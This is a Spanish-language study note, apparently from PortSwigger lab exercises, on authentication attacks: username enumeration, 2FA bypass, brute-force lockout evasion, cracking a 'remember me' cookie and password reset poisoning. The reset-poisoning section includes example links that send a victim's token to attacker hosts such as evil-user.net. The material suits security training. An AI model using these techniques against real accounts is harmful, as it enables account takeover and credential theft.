# AUTHENTICATION VULNERABILITIES

## Table of contents

- [AUTHENTICATION VULNERABILITIES](#authentication-vulnerabilities)
  - [Username enumeration via different responses](#username-enumeration-via-different-responses)
  - [Username enumeration via subtly different responses](#username-enumeration-via-subtly-different-responses)
  - [Username enumeration via response timing](#username-enumeration-via-response-timing)
  - [Username enumeration via account lock](#username-enumeration-via-account-lock)
  - [2FA simple bypass](#2fa-simple-bypass)
  - [2FA broken logic](#2fa-broken-logic)
  - [Password reset broken logic](#password-reset-broken-logic)
  - [Broken brute-force protection, IP block](#broken-brute-force-protection-ip-block)
  - [Broken brute-force protection, X-Forwarded-For](#broken-brute-force-protection-x-forwarded-for)
  - [Brute-forcing a stay-logged-in cookie](#brute-forcing-a-stay-logged-in-cookie)
  - [Offline password cracking](#offline-password-cracking)
  - [Password reset poisoning via middleware](#password-reset-poisoning-via-middleware)
  - [Password brute-force via password change](#password-brute-force-via-password-change)

## Username enumeration via different responses

A traves de una longitud de respuesta diferente es posible enumerar username validos.

## Username enumeration via subtly different responses

Puede que estemos enumerando nombres de usuarios usando burpsuite y filtremos por un mensaje en la respuesta como `Invalid username or password.`  puede haber una diferencia minima en esa frase que indique un posible usuario valido como que ya no exista el punto del final:

![[Pasted image 20230205164902.png]]

## Username enumeration via response timing


>[!tip]
>En algunos casos misentras mas longitud tiene los datos que enviamos mas tiempo demora la respuesta, por lo que es mas facil darse cuenta que respuesta toma mas tiempo.

![[Pasted image 20230205175140.png]]

en el intruder vamos a **columns -> response receive** y veremos cuanto demoro la respuesta:

![[Pasted image 20230205175320.png]]

estos usuarios demoran mas en la respuesta.

## Username enumeration via account lock

A partir de una lista de username posiblemente validos, una pagina bloqeua la cantidad de intento de login despues de 3 intento fallidos **SOLO A USUARIOS EXISTENTE** .

Es decir que si intentamos iniciar sesion con un username que no existe y cualquier contraseña N veces, no lo bloqueara porque el username no esxiste, en caso de existir al intento numero 3 lo hara esperar una cierta cantidad de tiempo.

Con intruder, para hacer que a partir de un listado de usernames pruebe con una cpontraseña incorrecta N veces, podemos realizar lo siguiente:

1. configuramos 2 payloads uno en el username y otro **AL LADO** del password:

![[Pasted image 20230205192115.png]]

2. en el segundo payloads podemos colocar una cierta cantidad de **null payloads** que equivale a no poner nada, como definimos una cantidad esto equivale a realizar multiples intentos:

![[Pasted image 20230205192314.png]]

filtramos por la longitud de respuesta y podemos encontrar usernames validos:

![[Pasted image 20230205192357.png]]

ya solo falta realizar brute force al password. (filtrando por aquellos que no muestran mensaje de error o bloqueo)

![[Pasted image 20230205193031.png]]

## 2FA simple bypass

supongamos que una pagina tiene implementado un 2FA con email en su login, podemos iniciar sesion con nuestra cuenta:

![[Pasted image 20230205153202.png]]

nos pedira el 2FA que nos llegara a nuestro correo:

![[Pasted image 20230205153247.png]]

![[Pasted image 20230205153304.png]]

con eso logramos ingresar a nuestra cuenta de usuario:

![[Pasted image 20230205153356.png]]

la ruta en la URL es `my-account`, si tenemos otras credenciales validas, podemos evadir el 2FA, despues de colocar las credenciales validas, ir directamente a la ruta de `my-account`:

## 2FA broken logic

Si vemos que el proceso de doble factor tiene vinculado en algun parametro el nombre del usuario (pe. cookie) podemos modificar ese valor con el nombre del usuario que queramos suplantar:

![[Pasted image 20230205205213.png]]

esto generara un 2FA para ese usuario, como no tenemos su bandeja de correo para recibir el codigo lo podemos hacer con brute force:

![[Pasted image 20230205205329.png]]

>[!note]
>Puede que este ultimo paso tengo una proteccion de rate limit, el cual debamos ver como hacer un bypass.


## Password reset broken logic

Si al momento de reestablecer la contraseña de nuestro usuario vemos que se envia el `username` como un parametro, podemos intentar modificar ese valor contra un usuario existente:

![[Pasted image 20230205162256.png]]

>[!tip]
>Podemos eliminar tokens y ver si igual funciona en caso de que esos valores se comprueben en una DB.
>

## Broken brute-force protection, IP block

- Puede que una pagina bloquee despues de un cierto numero de intentos fallidos. (cada N intentos)
- Ademas puede que si se coloca unas credenciales validas, el contador de intento fallidos se reestablesca.

Abusar de este ultimo punto es posible si a traves de un ataque de brute force colocamos:

```bash
credenciales_a_enumerar
credenciales_validas
credenciales_a_enumerar
credenciales_validas
credenciales_a_enumerar
credenciales_validas
```

De tal forma que no nos bloquee el ataque.

**EJEMPLO**

Supongamos que tenemos unas credenciales validas: **wiener:peter**
Un nombre de usuario valido: **carlos**

podemos crear los siguientes diccionarios de usuario y contraseña para intentar descubrir la contraseña de **carlos**:

```bash
#usuarios
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
...
```

```bash
#password
peter
password1
peter
password1
peter
password1
peter
password1
...
```

En el **intruder** configuramos un ataque de tipo **Pitchfork**. Configuramos en **Resource Pool** un nuevo pool que realice 1 peticion por segundo para que siga el orden de los diccionarios:

![[Pasted image 20230205190154.png]]

Y vamos a poder encontrar la contraseña de **carlos** sin ser bloqueados:

![[Pasted image 20230205190430.png]]


## Broken brute-force protection, X-Forwarded-For

podemos iterar el valor de este header junto a un ataque **pitchfork** para que simule crear una IP diferente en cada intento:

![[Pasted image 20230205174259.png]]


## Brute-forcing a stay-logged-in cookie

Una característica común es la opción de permanecer conectado incluso después de cerrar una sesión del navegador. Suele ser una simple casilla de verificación etiquetada como "Recordarme" o "Mantenerme conectado".

Esta funcionalidad a menudo se implementa generando un token "recuérdame" de algún tipo, que luego se almacena en una cookie persistente. Como poseer esta cookie le permite omitir todo el proceso de inicio de sesión, es una buena práctica que esta cookie no sea práctica de adivinar.

Algunos sitios web asumen que si la cookie está encriptada de alguna manera, no se podrá adivinar incluso si usa valores estáticos. Si bien esto puede ser cierto si se hace correctamente, "encriptar" ingenuamente la cookie usando una codificación bidireccional simple como Base64 no ofrece protección alguna. Incluso usar un hash debil como MD5 ya es predecible y puede ser crackeado.

**EJEMPLO**

Una pagina permite a los usuarios permanecer conectados **incluso después de cerrar la sesión del navegador**. La cookie utilizada para proporcionar esta funcionalidad es vulnerable a la fuerza bruta.

Si iniciamos sesion y habilitamos la opcion recuerdame, al llevarnos a nuestra cuenta se genera una cookie de persistencia:

![[Pasted image 20230206145103.png]]

bursuite detecta este valor como inseguro porque esta codificado en base64:

![[Pasted image 20230206145156.png]]

parece contener **usuario:contraseña** pero la contraseña parece estar hasheaday con md5, podemos usar crackstation para crackearla:

![[Pasted image 20230206145321.png]]

si tenemos un username valido podemos aplicar fuerza bruta para intentar encontrar su contraseña usando esta cookie.

**_Recordemos que la pagina  permite a los usuarios permanecer conectados incluso después de cerrar la sesión del navegador_**

Por lo que si **cerramos sesion de nuestro usuario actual** y encontramos la cookie correcta nos dejara entrar al perfil, hagamos esto con burpsuite, mandamos al repiter la peticion y en la parte de la cookie colocamos nuestro payload:

![[Pasted image 20230206145545.png]]

utilizamos un diccionario de contraseñas pero daremos un procesamiento en cada envio, la cookie tiene este formato:

```bash
base64(username:md5(password))
```

en la parte de payload configuramos lo siguiente:

![[Pasted image 20230206145704.png]]

Al valor de nuestro payload le aplicara lo siguiente:

- hashearlo en MD5. (md5(password))
- agregarle un prefijo del username. (carlos:md5(password))
- encodear todo el resultado en base64. (base64(username:md5(password)))

**_tenemos que configurar intruder para que solo realice una peticion por hilo ya que si envia muchas simultaneamente puede que no nos muestre el resultado:_**

![[Pasted image 20230420231208.png]]

vemos la diferencia en la longitud de respuesta y encontraremos su contraseña:

![[Pasted image 20230206145947.png]]

Aplicamos el proceso de descifrado para conocer su contraseña en texto plano.

## Offline password cracking

Podriamos obtener una cookie que contiene la contraseña del usuario a traves de un XSS almacenado:

![[Pasted image 20230206153628.png]]

podemos descifrarlo y tratar de recuperar su contraseña en texto plano:

![[Pasted image 20230206153823.png]]

![[Pasted image 20230206153901.png]]

## Password reset poisoning via middleware

Si la URL de reestablecimiento de contraseña que se envía al usuario se genera dinámicamente en función de una entrada controlable, como el encabezado del host, es posible construir un ataque de envenenamiento de restablecimiento de contraseña de la siguiente manera:

1.  El atacante obtiene la dirección de correo electrónico o el nombre de usuario de la víctima, según sea necesario, y envía una solicitud de restablecimiento de contraseña en su nombre. Al enviar el formulario, interceptan la solicitud HTTP resultante y modifican el encabezado del Host para que apunte a un dominio que controlan. Para este ejemplo, usaremos `evil-user.net`.
2.  La víctima recibe un correo electrónico de restablecimiento de contraseña genuino directamente desde el sitio web. Esto parece contener un enlace ordinario para restablecer su contraseña y, lo que es más importante, contiene un token de restablecimiento de contraseña válido que está asociado con su cuenta. Sin embargo, el nombre de dominio en la URL apunta al servidor del atacante:
    
```http
https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
```
    
3.  Si la víctima hace clic en este enlace (o se obtiene de alguna otra manera, por ejemplo, mediante un escáner antivirus), el token de restablecimiento de contraseña se entregará al servidor del atacante.
4.  El atacante ahora puede visitar la URL real del sitio web vulnerable y proporcionar el token robado de la víctima a través del parámetro correspondiente. Luego podrán restablecer la contraseña del usuario a lo que quieran y luego iniciar sesión en su cuenta.


**EJEMPLO**

supongamos que tenemos un link de **Forgot password?** en un inicio de sesion y tenemos un usuario propio para probar, vemos como se envia la peticion: (la pagina nos pedia un nombre de usuario)

![[Pasted image 20230206205627.png]]

y asi es como llega a su correo:

![[Pasted image 20230206205734.png]]

```bash
https://0a1800590338ee70c0cca01d00bc00fd.web-security-academy.net/forgot-password?temp-forgot-password-token=93Eo0CuyPony67DC6Qv7x3fvqoCqWDyZ
```

Resulta que toma la base del URL (0a1800590338ee70c0cca01d00bc00fd.web-security-academy.net) del encabezado `Host` o `X-Forwarded-Host` y esos parametros lo podemos controlar.

Asi que podemos definir nuestro servidor de atacante, colocar el username de nuestra vicitima y enviarlo cosa de que llegue algo asi:

```bash
https://hey.attacker.net/forgot-password?temp-forgot-password-token=93Eo0CuyPony67DC6Qv7x3fvqoCqWDyZ
```

Esto generara un `temp-forgot-password-token` para nuestra victima, cuando la victima presione nuestro link malicioso que le llegue al correo consultara a nuestro servidor la siguiente ruta que no existe `/forgot-password?temp-forgot-password-token=<TOKEN VICTIMA>` y ese dato lo veremos desde los logs de nuestro servidor.

Modificacion de la URL:

![[Pasted image 20230206210252.png]]

esperamos a que la victima ingrese al enlace y obtendremos su token en los logs del servidor:

![[Pasted image 20230206211049.png]]

como ya tenemos un link para cambio de contraseña que llego a nuestro correo, solo tenemos que reemplazar el token para cambiar la contraseña del usuario victima:

![[Pasted image 20230206211334.png]]

## Password brute-force via password change

a partir de la funcionalidad de **cambio de contraseña** y los **mensajes de error** podemos adivinar una contraseña de un usuario diferente.

Con una cuneta valida interactuamos con esta funcionalidad:

nos pide 3 cambios:

- contraseña actual
- nueva contraseña
- confirmar contraseña

![[Pasted image 20230206214648.png]]

si colocamos **correctamente** nuestra contraseña actual pero las otras 2 contraseñas no coinciden temeos el siguiente mensaje de error:

![[Pasted image 20230206214856.png]]

si colocamos **incorrectamente** nuestra contraseña actual y las otras 2 contraseñas no coinciden temeos el siguiente mensaje de error:

![[Pasted image 20230206214947.png]]

vemos ademas que en la peticion se envia el nombre del usuario a cambiar la contraseña:

![[Pasted image 20230206215026.png]]

podemos cambiar el nombre de usuario a adivinar su contraseña e iterar con un listado de contraseña para filtrar los mensajes de error:

![[Pasted image 20230206215132.png]]

![[Pasted image 20230206215233.png]]